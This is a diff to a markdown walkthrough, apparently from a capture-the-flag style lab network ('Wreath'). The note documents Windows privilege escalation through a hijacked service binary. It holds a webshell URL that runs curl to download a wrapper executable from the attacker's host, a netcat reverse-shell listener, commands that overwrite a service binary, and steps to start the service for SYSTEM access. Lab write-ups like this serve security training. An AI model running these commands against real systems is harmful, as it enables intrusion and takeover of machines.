@@ -92,6 +92,7 @@ namespace Wrapper{      
 }
 ```
 
+
 ## Compile
 
 We can now compile our program using the Mono `mcs` compiler. This is extremely simple using the package we installed earlier:
@@ -111,7 +112,7 @@ Transfer the `Wrapper.exe`   file to the target. Just to spice things up a bi
 
 ---
 
-### HTTP Sever
+### HTTP Server
 
 `http://10.200.84.100/resources/uploads/shell-KAIROS.jpeg.php?wreath=curl%20http://10.50.85.33/Wrapper.exe%20-o%20C:\\Windows\\Tasks\\Wrapper_KAIROS.exe`
 
@@ -125,7 +126,7 @@ Open a HTTP Server
 #Webshell 
 Download Wrapper.exe file.
 
-`curl http://10.50.85.33/Wrapper.exe -o C:\\Windows\\Tasks\\Wrapper.exe`
+`curl http://10.50.85.33/Wrapper.exe -o %TEMP%\wrapper-KAIROS.exe`
 
 
 ## Impacket
@@ -207,7 +208,10 @@ If you see a file called `System.exe` in the output then _please wait a few m
 If there is not already an exploit in the directory then it's time to root this thing!
 
 Copy your wrapper from `C:\Windows\Temp\wrapper-USERNAME.exe` to `C:\Program Files (x86)\System Explorer\System.exe` .  
-`copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"`
+```
+copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"
+```
+
 
 ![[7faedc9a86ab.png]]
 
@@ -232,7 +236,14 @@ Let's try stopping the service:
 
 ### Starting the Service
 
-We can stop the service, so chances are we can also start it! Set up a listener on your attacking machine then start the service:  
+We can stop the service, so chances are we can also start it! 
+
+#Attacking_Machine 
+Set up a listener.
+`sudo nc -lvnp 443` 
+
+#Reverse_Shell 
+Start the service:  
 `sc start SystemExplorerHelpService`
 
 ![[210940d0f105.png]]
@@ -241,3 +252,20 @@ We can stop the service, so chances are we can also start it! Set up a listener 
 >We have root!
 
 Notice that we got a message telling us that the service failed to start. This is because the wrapper we uploaded isn't actually a real Windows service file. Our executable still gets executed, but as far as Windows is concerned, the service failed to start.
+
+## Clear up
+
+There's only one thing left to do here.
+
+Let's clear up after ourselves by deleting the wrapper and starting the service:  
+```
+del "C:\Program Files (x86)\System Explorer\System.exe"
+
+sc start SystemExplorerHelpService
+```
+
+![[da5255d9443c 1.png]]
+
+Clearing up after exploits is a good habit to get into. This also has the added bonus of being courteous to other users in the box who may be about to perform the exploit. Note that deleting the wrapper and restarting the service did not destroy the system shell!
+
+**Next step: ** [[Exfiltration Techniques & Post Exploitation]]
